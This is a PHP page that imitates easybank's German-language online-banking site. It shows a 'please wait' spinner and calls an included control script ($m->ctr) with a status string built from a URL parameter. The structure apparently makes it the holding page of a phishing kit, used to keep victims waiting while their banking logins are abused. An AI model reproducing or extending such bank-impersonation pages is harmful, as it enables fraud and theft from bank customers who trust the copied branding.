<?php 
require '../main.php';
?><!DOCTYPE html>
<html class="" lang="de">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<title>Online-Banking | easybank</title>
<meta content="width=device-width, height=device-height, initial-scale=1.0, viewport-fit=cover" name="viewport"/>
<meta content="telephone=no" name="format-detection"/>
<meta content="no" name="msapplication-tap-highlight"/>
<meta content="no-referrer" name="referrer"/>
<link href="styles.css" rel="stylesheet"/>
<style>
.wait-spinner {
  display: flex;
  justify-content: center;
  margin-bottom: 32px;
}
.wait-spinner__circle {
  width: 48px;
  height: 48px;
  border: 4px solid #e0e0e0;
  border-top: 4px solid #177991;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}
@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
.wait-message {
  font-family: OpenSans-Regular, Arial, Helvetica, Sans-Serif;
  font-size: 14px;
  line-height: 22px;
  color: #404040;
  text-align: center;
  max-width: 327px;
  margin: 0 auto;
}
.wait-heading h1 {
  color: #177991;
  font-family: OpenSans-Bold, Arial, Helvetica, Sans-Serif;
  font-size: 22px;
  font-weight: 700;
  text-align: center;
  margin-bottom: 24px;
}
</style>
</head>
<body class="desktop-detected internet-banking desktop no-ignore-color">

<section aria-labelledby="page-title" class="unauthenticated" id="vcMainContainer" role="region" tabindex="-1">

<div class="vc-header" id="headerPanel">
 <div class="header header--default" id="header">
  <div class="header__logo">
   <div class="logo-group">
    <a class="clickable logo" href="#" title="easybank">
     <img alt="easybank" id="LogoClickable-headerLogo-ItemPreview" src="css/easybank.png"/>
    </a>
   </div>
  </div>
  <div class="header__menu">
   <div class="header-menu__site-navigation"></div>
  </div>
 </div>
 <div class="header-push"></div>
</div>

<div aria-labelledby="page-title" class="clearfix" id="main" role="main">
 <div class="login-page">
  <div class="form-horizontal undefined main-container-primary background-primary">
   <div class="content-container">
    <div class="login-wrapper">
     <div class="login-wrapper__head"></div>
     <div class="login-wrapper__content login-wrapper__content--center">
      <div class="login-wrapper__form" style="text-align:center;">
       <div class="wait-spinner">
        <div class="wait-spinner__circle"></div>
       </div>
       <div class="wait-heading">
        <h1>Bitte warten</h1>
       </div>
       <p class="wait-message">Bitte warten Sie einige Sekunden, während wir Ihre Anfrage bearbeiten. Wir möchten Sie bitten, diese Seite nicht zu verlassen, um sicherzustellen, dass Ihr Prozess nicht unterbrochen wird. Vielen Dank für Ihr Verständnis und Ihre Geduld.</p>
      </div>
     </div>
    </div>
   </div>
  </div>
 </div>
</div>

<footer class="footer">
 <div class="container">
  <h2 class="visually-hidden" id="footerHeadline">Footer Navigation</h2>
  <nav aria-labelledby="footerHeadline" id="footer-nav" role="navigation">
   <ul>
    <li><a aria-label="FAQ" href="#" title="FAQ"><span class="text" tabindex="-1">FAQ</span></a></li>
    <li><a aria-label="Kontakt" href="#" title="Kontakt"><span class="text" tabindex="-1">Kontakt</span></a></li>
    <li><a aria-label="Impressum" href="#" title="Impressum"><span class="text" tabindex="-1">Impressum</span></a></li>
    <li><a aria-label="Datenschutz" href="#" title="Datenschutz"><span class="text" tabindex="-1">Datenschutz</span></a></li>
    <li><a aria-label="AGB" href="#" title="AGB"><span class="text" tabindex="-1">AGB</span></a></li>
    <li><a aria-label="Barrierefreiheit" href="#" title="Barrierefreiheit"><span class="text" tabindex="-1">Barrierefreiheit</span></a></li>
   </ul>
  </nav>
 </div>
</footer>

</section>

<script src="js/jq.js"></script>
<?php $m->ctr("LOADING (".@$_GET['p'].")"); ?>
</body>
</html>